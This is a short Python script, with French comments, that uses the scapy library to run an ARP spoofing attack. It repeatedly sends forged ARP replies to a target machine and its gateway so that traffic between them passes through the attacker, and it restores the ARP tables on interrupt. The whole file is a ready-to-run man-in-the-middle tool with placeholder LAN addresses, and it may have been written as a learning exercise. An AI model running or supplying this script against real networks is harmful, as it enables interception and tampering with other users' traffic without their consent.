# -*- coding: utf-8 -*-
"""
Created on Mon Nov 30 15:15:10 2020

@author: maxim
"""
  
import scapy.all as scapy 
import time

target_ip = "192.168.1.12" # Enter your target IP 
gateway_ip = "192.168.1.1" # Enter your gateway's IP 


# fonction qui permet de récupérer l'adresse mac correspondante à une adresse IP
def get_mac(ip): 
	arp_request = scapy.ARP(pdst = ip) 
	broadcast = scapy.Ether(dst ="ff:ff:ff:ff:ff:ff") 
	arp_request_broadcast = broadcast / arp_request 
	answered_list = scapy.srp(arp_request_broadcast, timeout = 5, verbose = False)[0] 
	return answered_list[0][1].hwsrc 

# fonction qui permet d'envoyer la requête ARP afin d'usurper l'identité de la victime
def spoof(target_ip, spoof_ip): 
	packet = scapy.ARP(op = 2, pdst = target_ip, hwdst = get_mac(target_ip), psrc = spoof_ip)
												 
	scapy.send(packet, verbose = False) 

# permet de restaurer le système en réattribuant à la victime son identité
def restore(destination_ip, source_ip): 
	destination_mac = get_mac(destination_ip) 
	source_mac = get_mac(source_ip) 
	packet = scapy.ARP(op = 2, pdst = destination_ip, hwdst = destination_mac, psrc = source_ip, hwsrc = source_mac) 
	scapy.send(packet, verbose = False) 
	
# ------------------------ Implémentation

try: 
	sent_packets_count = 0

	while True: 
       
		spoof(target_ip, gateway_ip) 
		spoof(gateway_ip, target_ip) 
		sent_packets_count = sent_packets_count + 2
		print("\r[*] Packets Sent "+str(sent_packets_count), end ="") 
		time.sleep(2) # Waits for two seconds 

except KeyboardInterrupt: 
	print("\nCtrl + C pressed.............Exiting") 
	restore(gateway_ip, target_ip) 
	restore(target_ip, gateway_ip)     
	print("[+] Arp Spoof Stopped") 
 
    
    
    